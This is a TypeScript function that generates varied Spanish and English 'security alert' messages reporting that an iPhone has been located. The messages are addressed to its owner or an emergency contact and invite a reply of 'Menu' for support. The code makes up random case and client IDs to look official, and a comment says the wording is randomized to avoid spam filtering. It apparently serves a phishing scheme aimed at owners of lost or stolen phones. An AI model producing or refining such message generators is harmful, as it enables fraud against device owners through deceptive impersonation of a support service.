// Generar ID de caso aleatorio (CAS-YYYYMMDD-XXXX)
const generateCaseId = () => {
  const now = new Date();
  const dateStr = now.toISOString().slice(0, 10).replace(/-/g, '');
  const random4Digits = Math.floor(1000 + Math.random() * 9000);
  return `CAS-${dateStr}-${random4Digits}`;
};

// Generar ID de cliente aleatorio (CL-XXXXXXXXXXXX)
const generateClientId = () => {
  const random12Digits = Math.floor(100000000000 + Math.random() * 900000000000);
  return `CL-${random12Digits}`;
};

// Utilidad para generar mensajes aleatorios y evitar spam
export const generateRandomMessage = (process: any, language: 'spanish' | 'english', battery: number, delayedTime: Date, formatDate: (date: Date, lang: string) => string, formatTime: (date: Date) => string) => {
  const random = (arr: any[]) => arr[Math.floor(Math.random() * arr.length)];
  const caseId = generateCaseId();
  const clientId = generateClientId();
  
  if (language === 'spanish') {
    if (process.contact_type === 'propietario') {
      // Variaciones para mensajes al propietario en español
      const openings = [
        "🛡️ Alerta de seguridad del sistema",
        "🔐 Notificación de seguridad",
        "🔒 Sistema de protección activado"
      ];
      
      const detectionPhrases = [
        `Fecha: ${formatDate(delayedTime, 'spanish')} – ${formatTime(delayedTime)}\nActividad detectada tras reconexión a internet.\nEstado del dispositivo: En línea ✅\n\nID de caso: ${caseId}\nID de cliente: ${clientId}`,
        `Registro: ${formatDate(delayedTime, 'spanish')} – ${formatTime(delayedTime)}\nEquipo detectado después de conectarse a la red.\nEstatus: Operativo ✅\n\nCaso: ${caseId}\nCliente: ${clientId}`,
        `Hora: ${formatDate(delayedTime, 'spanish')} – ${formatTime(delayedTime)}\nDispositivo localizado al establecer conexión.\nEstado: Activo ✅\n\nReferencia: ${caseId}\nUsuario: ${clientId}`
      ];
      
      const statusPhrases = [
        "Detalles del dispositivo:",
        "Información del equipo:",
        "Datos técnicos:"
      ];
      
      
      const deviceSections = [
        `• Modelo: ${process.iphone_model}
• Color: ${process.color} | Capacidad: ${process.storage}
• IMEI: ${process.imei}
• Serie: ${process.serial_number}
• Nivel de batería: ${battery} %`,
        
        `• Dispositivo: ${process.iphone_model}
• Coloración: ${process.color} | Almacenamiento: ${process.storage}
• Código IMEI: ${process.imei}
• No. Serie: ${process.serial_number}
• Batería actual: ${battery} %`,
        
        `• Equipo: ${process.iphone_model}
• Color: ${process.color} | Memoria: ${process.storage}
• Identificador IMEI: ${process.imei}
• Número de serie: ${process.serial_number}
• Carga restante: ${battery} %`
      ];
      
      const helpPhrases = [
        "¿Necesitás ayuda? Escribí *Menú* para asistencia técnica 👨‍💻",
        "¿Requerís soporte? Respondé *Menú* para ayuda especializada 🔧",
        "¿Buscás asistencia? Enviá *Menú* para contactar soporte 👩‍💻"
      ];
      
      const closings = [
        "Servicio automatizado – Atención disponible 24 h",
        "Sistema automático – Soporte activo 24/7",
        "Monitoreo continuo – Asistencia permanente"
      ];
      
      return `${random(openings)}

${random(detectionPhrases)}

${random(statusPhrases)}
${random(deviceSections)}

${random(helpPhrases)}
${random(closings)}`;
      
    } else {
      // Variaciones para contacto de emergencia en español - CONCISO y profesional
      const openings = [
        "🛡️ Alerta de seguridad",
        "🔐 Notificación de seguridad",
        "🔒 Sistema de protección activado"
      ];
      
      const detectionPhrases = [
        `Fecha: ${formatDate(delayedTime, 'spanish')} – ${formatTime(delayedTime)}\nEl dispositivo de **${process.owner_name || 'usuario registrado'}** ha sido localizado.\nEstado: En línea ✅\n\nID de caso: ${caseId}`,
        `Registro: ${formatDate(delayedTime, 'spanish')} – ${formatTime(delayedTime)}\nEquipo de **${process.owner_name || 'usuario registrado'}** detectado.\nEstatus: Operativo ✅\n\nCaso: ${caseId}`,
        `Hora: ${formatDate(delayedTime, 'spanish')} – ${formatTime(delayedTime)}\nDispositivo de **${process.owner_name || 'usuario registrado'}** rastreado.\nEstado: Activo ✅\n\nReferencia: ${caseId}`
      ];
      
      const deviceSections = [
        `Detalles del dispositivo:
• Modelo: ${process.iphone_model}
• Color: ${process.color} | Capacidad: ${process.storage}
• IMEI: ${process.imei}
• Serie: ${process.serial_number}
• Batería: ${battery}%`,
        
        `Información del equipo:
• Dispositivo: ${process.iphone_model}
• Color: ${process.color} | Almacenamiento: ${process.storage}
• Código IMEI: ${process.imei}
• No. Serie: ${process.serial_number}
• Nivel batería: ${battery}%`
      ];
      
      const instructionPhrases = [
        "Por favor, informa al propietario que su equipo fue localizado.",
        "Notifica al dueño que su dispositivo ha sido encontrado.",
        "Comunica al propietario que su equipo fue detectado."
      ];
      
      const helpPhrases = [
        "¿Necesitás ayuda? Escribí *Menú* para asistencia técnica 👨‍💻",
        "¿Requerís soporte? Respondé *Menú* para ayuda especializada 🔧",
        "¿Buscás asistencia? Enviá *Menú* para contactar soporte 👩‍💻"
      ];
      
      const closings = [
        "Servicio automatizado – Atención disponible 24 h",
        "Sistema automático – Soporte activo 24/7",
        "Monitoreo continuo – Asistencia permanente"
      ];
      
      return `${random(openings)}

${random(detectionPhrases)}

${random(deviceSections)}

${random(instructionPhrases)}

${random(helpPhrases)}
${random(closings)}`;
    }
  } else {
    // Mensajes en inglés con variaciones similares
    if (process.contact_type === 'propietario') {
      const openings = [
        "🛡️ System security alert",
        "🔐 Security notification",
        "🔒 Protection system activated"
      ];
      
      const detectionPhrases = [
        `Date: ${formatDate(delayedTime, 'english')} – ${formatTime(delayedTime)}\nActivity detected after internet reconnection.\nDevice status: Online ✅\n\nCase ID: ${caseId}\nClient ID: ${clientId}`,
        `Record: ${formatDate(delayedTime, 'english')} – ${formatTime(delayedTime)}\nDevice detected after network connection.\nStatus: Operational ✅\n\nCase: ${caseId}\nClient: ${clientId}`,
        `Time: ${formatDate(delayedTime, 'english')} – ${formatTime(delayedTime)}\nDevice located upon connection establishment.\nStatus: Active ✅\n\nReference: ${caseId}\nUser: ${clientId}`
      ];
      
      const statusPhrases = [
        "Device details:",
        "Equipment information:",
        "Technical data:"
      ];
      
      
      const deviceSections = [
        `• Model: ${process.iphone_model}
• Color: ${process.color} | Capacity: ${process.storage}
• IMEI: ${process.imei}
• Serial: ${process.serial_number}
• Battery level: ${battery} %`,
        
        `• Device: ${process.iphone_model}
• Color: ${process.color} | Storage: ${process.storage}
• IMEI Code: ${process.imei}
• Serial No.: ${process.serial_number}
• Current battery: ${battery} %`
      ];
      
      const helpPhrases = [
        "Need help? Write *Menu* for technical assistance 👨‍💻",
        "Require support? Reply *Menu* for specialized help 🔧",
        "Looking for assistance? Send *Menu* to contact support 👩‍💻"
      ];
      
      const closings = [
        "Automated service – 24 h assistance available",
        "Automatic system – 24/7 active support",
        "Continuous monitoring – Permanent assistance"
      ];
      
      return `${random(openings)}

${random(detectionPhrases)}

${random(statusPhrases)}
${random(deviceSections)}

${random(helpPhrases)}
${random(closings)}`;
      
    } else {
      // Emergency contact message in English - CONCISE and professional
      const openings = [
        "🛡️ Security alert",
        "🔐 Security notification",
        "🔒 Protection system activated"
      ];
      
      const detectionPhrases = [
        `Date: ${formatDate(delayedTime, 'english')} – ${formatTime(delayedTime)}\nDevice belonging to **${process.owner_name || 'registered user'}** has been located.\nStatus: Online ✅\n\nCase ID: ${caseId}`,
        `Record: ${formatDate(delayedTime, 'english')} – ${formatTime(delayedTime)}\nEquipment owned by **${process.owner_name || 'registered user'}** detected.\nStatus: Operational ✅\n\nCase: ${caseId}`,
        `Time: ${formatDate(delayedTime, 'english')} – ${formatTime(delayedTime)}\nDevice from **${process.owner_name || 'registered user'}** tracked.\nStatus: Active ✅\n\nReference: ${caseId}`
      ];
      
      const deviceSections = [
        `Device details:
• Model: ${process.iphone_model}
• Color: ${process.color} | Storage: ${process.storage}
• IMEI: ${process.imei}
• Serial: ${process.serial_number}
• Battery: ${battery}%`,
        
        `Equipment information:
• Device: ${process.iphone_model}
• Color: ${process.color} | Capacity: ${process.storage}
• IMEI Code: ${process.imei}
• Serial No.: ${process.serial_number}
• Battery level: ${battery}%`
      ];
      
      const instructionPhrases = [
        "Please inform the owner that their device was located.",
        "Notify the owner that their device has been found.",
        "Communicate to the owner that their equipment was detected."
      ];
      
      const helpPhrases = [
        "Need help? Write *Menu* for technical assistance 👨‍💻",
        "Require support? Reply *Menu* for specialized help 🔧",
        "Looking for assistance? Send *Menu* to contact support 👩‍💻"
      ];
      
      const closings = [
        "Automated service – 24 h assistance available",
        "Automatic system – 24/7 active support",
        "Continuous monitoring – Permanent assistance"
      ];
      
      return `${random(openings)}

${random(detectionPhrases)}

${random(deviceSections)}

${random(instructionPhrases)}

${random(helpPhrases)}
${random(closings)}`;
    }
  }
};
